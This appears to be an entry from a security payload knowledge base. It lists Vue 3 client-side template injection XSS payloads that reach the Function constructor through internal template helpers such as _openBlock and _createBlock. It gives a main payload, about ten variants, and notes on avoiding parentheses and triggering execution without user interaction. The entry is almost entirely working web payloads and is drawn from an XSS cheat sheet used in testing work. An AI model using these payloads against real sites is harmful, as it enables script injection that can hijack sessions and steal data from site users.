---
title: Vue 3 Constructor Chain via Internal Globals
slug: vue3-constructor-chain
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/csti, sink/vue3]
inbound: []
---

# Vue 3 Constructor Chain via Internal Globals

## Payload

```html
{{_openBlock.constructor('alert(1)')()}}
```

## Variants

```html
{{_createBlock.constructor('alert(1)')()}}
{{_toDisplayString.constructor('alert(1)')()}}
{{_createVNode.constructor('alert(1)')()}}
{{_Vue.h.constructor`alert(1)`()}}
{{$emit.constructor`alert(1)`()}}
<p v-show=_createBlock.constructor`alert(1)`()>
<x @[_openBlock.constructor`alert(1)`()]>
<x @[_capitalize.constructor`alert(1)`()]>
<x @click=_withCtx.constructor`alert(1)`()>click</x>
<x @click=$event.view.alert(1)>click</x>
```

## Context

Vue 3 exposes different internal runtime helpers in the template scope: `_openBlock`, `_createBlock`, `_toDisplayString`, `_createVNode`, `_capitalize`, `_withCtx`, `_Vue.h`, and `$emit`. All are function objects reachable via `.constructor` to `Function`. Template literal tagged-function form avoids parentheses. `$event.view` gives a direct window reference in event handler contexts. No user interaction needed for non-`@click` variants.

## Provenance

- Distilled from: `../../techniques/dom-xss/framework-vectors-vue.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [Vue.js Framework Vectors](../../techniques/dom-xss/framework-vectors-vue.md)
- [Client-Side Template Injection](../../techniques/dom-xss/client-side-template-injection.md)
